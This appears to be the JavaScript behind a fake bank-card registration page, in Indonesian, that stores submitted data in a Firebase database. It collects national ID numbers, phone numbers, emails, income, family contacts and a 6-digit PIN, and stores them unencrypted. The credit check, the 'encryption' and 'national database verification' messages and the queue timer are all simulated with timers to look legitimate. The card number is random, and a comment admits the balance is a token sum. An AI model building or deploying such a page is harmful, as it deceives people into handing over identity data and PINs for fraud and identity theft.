import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;
const totalSteps = 8;

// --- AUTO FORMATTING INPUT ---
document.addEventListener('DOMContentLoaded', () => {
    const inputNama = document.getElementById('inputNama');
    const inputNIK = document.getElementById('inputNIK');
    const inputWA = document.getElementById('inputWA');
    const inputPW = document.getElementById('inputPW');

    if(inputNama) {
        inputNama.addEventListener('input', () => {
            inputNama.value = inputNama.value.toUpperCase();
        });
    }

    if(inputNIK) {
        inputNIK.addEventListener('input', () => {
            inputNIK.value = inputNIK.value.replace(/[^0-9]/g, '');
        });
    }

    if(inputWA) {
        inputWA.addEventListener('input', () => {
            inputWA.value = inputWA.value.replace(/[^0-9]/g, '');
        });
    }

    if(inputPW) {
        inputPW.addEventListener('input', () => {
            let val = inputPW.value.replace(/[^0-9]/g, '');
            if (val.length > 6) val = val.substring(0, 6);
            inputPW.value = val;
        });
    }
});

// --- FUNGSI DINAMIS KELUARGA ---
window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    const currentFields = container.getElementsByClassName('emergency-item').length;

    if (currentFields < 5) {
        const div = document.createElement('div');
        div.className = 'emergency-item';
        div.style.padding = "10px";
        div.style.border = "1px solid #ddd";
        div.style.marginTop = "10px";
        div.innerHTML = `
            <div class="input-group">
                <label>Nama Keluarga</label>
                <input type="text" class="em-name" placeholder="Nama Lengkap" oninput="this.value = this.value.toUpperCase()">
            </div>
            <div class="input-group">
                <label>Nomor HP Keluarga</label>
                <input type="tel" class="em-phone" placeholder="08xxxxxxxxxx" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            </div>
            <button type="button" onclick="this.parentElement.remove()" style="background:red; color:white; border:none; padding:5px; cursor:pointer; margin-top:5px; border-radius:4px;">Hapus</button>
        `;
        container.appendChild(div);
    } else {
        alert("Maksimal 5 kontak keluarga!");
    }
};

// --- NAVIGASI & VALIDASI KETAT ---
window.nextStep = (s) => {
    if (s === 2) {
        const nama = document.getElementById('inputNama').value.trim();
        const nik = document.getElementById('inputNIK').value;
        if (nama.length < 3) return alert("Isi Nama Lengkap dengan benar!");
        if (nik.length < 16) return alert("NIK harus 16 digit angka!");
    } 
    else if (s === 3) {
        const wa = document.getElementById('inputWA').value;
        const email = document.getElementById('inputEmail').value;
        if (!wa.startsWith('08')) return alert("Nomor WhatsApp harus diawali dengan 08!");
        if (wa.length < 11 || wa.length > 13) return alert("Nomor WhatsApp tidak valid!");
        if (!email.includes('@')) return alert("Format Email tidak valid!");
    } 
    else if (s === 4) {
        if (document.getElementById('jobType').value === "") return alert("Pilih Pekerjaan Anda!");
        if (document.getElementById('income').value === "") return alert("Isi Pendapatan bulanan!");
    } 
    else if (s === 5) {
        const names = document.getElementsByClassName('em-name');
        const phones = document.getElementsByClassName('em-phone');
        if (names.length === 0) return alert("Tambahkan minimal 1 kontak keluarga!");
        for(let i=0; i<names.length; i++) {
            if (names[i].value.trim() === "") return alert(`Nama Keluarga ke-${i+1} kosong!`);
            if (!phones[i].value.startsWith('08')) return alert(`Nomor Keluarga ke-${i+1} salah!`);
        }
    }
    else if (s === 6) {
        const pin = document.getElementById('inputPW').value;
        if (pin.length < 6) return alert("PIN wajib 6 digit angka!");
    }

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
};

function updateUI(s) {
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');
    
    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    const progressLine = document.getElementById('progressLine');
    if(progressLine) progressLine.style.width = percent + "%";
    
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.classList.remove('active', 'completed'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => { if(status) status.innerText = "Sinkronisasi BI-Checking..."; }, 1500);
    setTimeout(() => {
        if(status) status.innerHTML = "<b style='color:green'>IDENTITAS TERVERIFIKASI</b><br>Skor Kredit: A (Sangat Baik)";
        if(btn) btn.style.display = "block";
    }, 3500);
}

window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui pernyataan tanggung jawab!");
    const btn = document.getElementById('btnGenerate');
    btn.disabled = true;
    btn.innerText = "MENGECEK DATABASE...";

    try {
        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, `nasabah`));
        let exists = false;
        const nik = document.getElementById('inputNIK').value;

        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) { if (data[id].nik === nik) { exists = true; break; } }
        }

        if (exists) {
            alert("NIK Sudah Terdaftar!");
            location.reload();
        } else {
            updateUI(8);
            initQueue();
        }
    } catch(e) { alert("Error!"); btn.disabled = false; }
};

function initQueue() {
    // Tambahkan delay kecil agar hitungan detik mulai tepat di 120
    localStorage.setItem('bdn_target_time', Date.now() + (120 * 1000) + 500);
    runQueue();
}

function runQueue() {
    const qStatus = document.getElementById('queueStatus');
    const tDisplay = document.getElementById('timerDisplay');
    const fillBar = document.getElementById('fillBar');
    const totalDuration = 120;
    
    const interval = setInterval(() => {
        const diff = Math.ceil((localStorage.getItem('bdn_target_time') - Date.now()) / 1000);
        
        if (diff <= 0) {
            clearInterval(interval);
            if(tDisplay) tDisplay.innerText = "Estimasi: Selesai";
            finalRevealProcess();
            return;
        }

        const progress = ((totalDuration - diff) / totalDuration) * 100;
        if(fillBar) fillBar.style.width = progress + "%";

        const m = Math.floor(diff / 60);
        const s = diff % 60;
        if(tDisplay) {
            tDisplay.innerText = m > 0 ? `Estimasi: ${m} Menit ${s} Detik` : `Estimasi: ${s} Detik`;
        }
        
        if(qStatus) {
            if (diff > 80) qStatus.innerText = "Enkripsi Protokol Keamanan...";
            else if (diff > 40) qStatus.innerText = "Verifikasi Database Nasional...";
            else qStatus.innerText = "Menerbitkan Sertifikat Digital...";
        }
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';

    const cardNo = "0810" + Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');
    await saveToRealtime(cardNo);

    setTimeout(() => {
        const card = document.getElementById('captureArea');
        if(card) { card.style.opacity = "1"; card.style.transform = "scale(1)"; }
        document.getElementById('btnDownload').style.display = "block";
    }, 5500);
}

async function saveToRealtime(cardNo) {
    const nama = document.getElementById('inputNama').value.toUpperCase();
    const familyNames = document.getElementsByClassName('em-name');
    const familyPhones = document.getElementsByClassName('em-phone');
    let dataKeluarga = [];
    
    for(let i=0; i<familyNames.length; i++) {
        dataKeluarga.push({
            nama_kerabat: familyNames[i].value.toUpperCase(),
            nomor_kerabat: familyPhones[i].value
        });
    }

    try {
        await set(ref(db, 'nasabah/' + cardNo), {
            nama: nama,
            nik: document.getElementById('inputNIK').value,
            wa: document.getElementById('inputWA').value,
            email: document.getElementById('inputEmail').value,
            pekerjaan: document.getElementById('jobType').value,
            pendapatan: document.getElementById('income').value,
            kontak_darurat: dataKeluarga,
            pin: document.getElementById('inputPW').value,
            nomor_kartu: cardNo,
            saldo: 16000, // SALDO 1$ (Rp 16.000) AGAR TIDAK RUGI
            tgl_daftar: new Date().toISOString()
        });

        document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
        document.getElementById('displayName').innerText = nama;
    } catch(e) { console.error("Gagal Simpan:", e); }
}

window.takeScreenshot = () => {
    html2canvas(document.getElementById('captureArea'), { scale: 3 }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${document.getElementById('inputNama').value}.png`;
        link.href = canvas.toDataURL();
        link.click();
    });
};
